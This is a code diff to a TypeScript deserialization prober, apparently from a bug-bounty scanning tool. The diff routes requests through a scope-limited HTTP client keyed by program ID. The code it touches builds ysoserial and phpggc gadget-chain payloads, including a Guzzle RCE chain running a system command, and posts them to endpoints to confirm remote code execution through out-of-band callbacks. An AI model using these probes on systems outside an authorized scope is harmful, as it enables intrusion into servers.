@@ -26,7 +26,7 @@
  * match, which is exactly the class of bug already fixed once in
  * probeDeserialize's RCE oracle.
  */
-import axios from "axios";
+import { scopedHttp } from "../net/scoped-http";
 import { execFile } from "child_process";
 import { promisify } from "util";
 import path from "path";
@@ -118,7 +118,7 @@ async function generatePhpggc(chain: string, args: string[]): Promise<string | n
 }
 
 class DeserializationProber {
-  async probe(targetUrl: string, authHeaders?: Record<string, string>): Promise<DeserializationProbeResult> {
+  async probe(targetUrl: string, authHeaders?: Record<string, string>, programId?: number): Promise<DeserializationProbeResult> {
     const base = targetUrl.replace(/\/$/, "");
     const endpoints = CANDIDATE_PATHS.map(p => `${base}${p}`);
     const vulns: DeserializationVuln[] = [];
@@ -130,10 +130,10 @@ class DeserializationProber {
     ]);
 
     for (const endpoint of endpoints) {
-      const javaVuln = await this.tryJava(endpoint, headers, hasYsoserial);
+      const javaVuln = await this.tryJava(endpoint, headers, hasYsoserial, programId);
       if (javaVuln) vulns.push(javaVuln);
 
-      const phpVuln = await this.tryPhp(endpoint, headers, hasPhpggc);
+      const phpVuln = await this.tryPhp(endpoint, headers, hasPhpggc, programId);
       if (phpVuln) vulns.push(phpVuln);
     }
 
@@ -161,17 +161,18 @@ class DeserializationProber {
     endpoint: string,
     headers: Record<string, string>,
     hasYsoserial: boolean,
+    programId?: number,
   ): Promise<DeserializationVuln | null> {
     if (hasYsoserial) {
       const { beaconId, callbackUrl } = callbackServer.generateBeacon();
       try {
         const payload = await generateYsoserialUrldns(callbackUrl);
         if (payload) {
-          await axios.post(endpoint, payload, {
+          await scopedHttp.post(endpoint, payload, {
             headers: { "Content-Type": "application/x-java-serialized-object", ...headers },
             timeout: 8000,
             validateStatus: () => true,
-          });
+          }, programId);
           const hit = await callbackServer.waitForHit(beaconId, 10000);
           if (hit) {
             const detail = `ysoserial URLDNS gadget triggered a real OOB DNS/HTTP callback at ${endpoint} (beacon: ${beaconId}) — confirmed Java deserialization of attacker-controlled input.`;
@@ -190,11 +191,11 @@ class DeserializationProber {
     // for a genuine deserialization error signature (not a bare substring).
     try {
       const garbage = Buffer.concat([JAVA_MAGIC, Buffer.from("nettyhunter-fingerprint-probe")]);
-      const resp = await axios.post(endpoint, garbage, {
+      const resp = await scopedHttp.post(endpoint, garbage, {
         headers: { "Content-Type": "application/x-java-serialized-object", ...headers },
         timeout: 8000,
         validateStatus: () => true,
-      });
+      }, programId);
       const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
       if (JAVA_ERROR_SIGNATURE.test(body)) {
         const detail = `Endpoint ${endpoint} returned a Java deserialization error signature (${body.match(JAVA_ERROR_SIGNATURE)?.[0]}) in response to malformed serialized input — the backend is attempting real Java deserialization on this input, but no working gadget was confirmed.`;
@@ -211,6 +212,7 @@ class DeserializationProber {
     endpoint: string,
     headers: Record<string, string>,
     hasPhpggc: boolean,
+    programId?: number,
   ): Promise<DeserializationVuln | null> {
     if (hasPhpggc) {
       const chains: Array<{ name: string; technique: DeserializationVuln["technique"]; args: string[] }> = [
@@ -224,11 +226,11 @@ class DeserializationProber {
           const args = chain.name === "Guzzle/RCE1" ? ["system", command] : [command];
           const payload = await generatePhpggc(chain.name, args);
           if (payload) {
-            await axios.post(endpoint, payload, {
+            await scopedHttp.post(endpoint, payload, {
               headers: { "Content-Type": "text/plain", ...headers },
               timeout: 8000,
               validateStatus: () => true,
-            });
+            }, programId);
             const hit = await callbackServer.waitForHit(beaconId, 10000);
             if (hit) {
               const detail = `phpggc ${chain.name} gadget chain triggered a real OOB callback at ${endpoint} (beacon: ${beaconId}) — confirmed PHP deserialization RCE of attacker-controlled input.`;
@@ -248,11 +250,11 @@ class DeserializationProber {
     // a genuine unserialize() error/warning signature.
     try {
       const garbage = 'O:8:"stdClass":99:{s:4:"test";s:5:"hello";}';
-      const resp = await axios.post(endpoint, garbage, {
+      const resp = await scopedHttp.post(endpoint, garbage, {
         headers: { "Content-Type": "text/plain", ...headers },
         timeout: 8000,
         validateStatus: () => true,
-      });
+      }, programId);
       const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
       if (PHP_ERROR_SIGNATURE.test(body)) {
         const detail = `Endpoint ${endpoint} returned a PHP unserialize() error signature in response to malformed serialized input — the backend is attempting real PHP deserialization on this input, but no working gadget was confirmed.`;
